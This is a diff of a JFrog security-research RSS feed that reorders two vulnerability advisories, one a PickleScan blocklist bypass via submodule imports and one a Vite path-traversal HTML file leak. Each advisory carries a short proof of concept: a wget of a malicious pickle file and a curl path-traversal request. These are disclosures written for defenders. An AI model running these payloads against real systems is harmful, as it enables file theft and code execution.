@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Mon, 16 Nov 2026 11:05:12 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 17 Nov 2026 00:24:11 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -3007,6 +3007,54 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.
+
+## PoC
+
+The following steps demonstrate the bypass.
+
+```bash
+# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
+wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl
+
+# 2. Scan the file with PickleScan.
+picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g
+
+# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
+# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
@@ -3054,54 +3102,6 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.
-
-## PoC
-
-The following steps demonstrate the bypass.
-
-```bash
-# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
-wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl
-
-# 2. Scan the file with PickleScan.
-picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g
-
-# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
-# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
 ]]></content:encoded>
         </item>
         <item>
@@ -3321,6 +3321,54 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Vite arbitrary restricted remote file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</link>
             <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</guid>
@@ -3389,54 +3437,6 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Vite arbitrary remote HTML file leak
-
-## Component
-
-[vite](https://www.npmjs.com/package/vite)
-
-## Affected versions
-
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
-
-## Description
-
-This vulnerability allows a remote attacker to leak any HTML file on the system.
-
-## PoC
-
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
-```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this vulnerability 
-
-
-
-## References
-
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
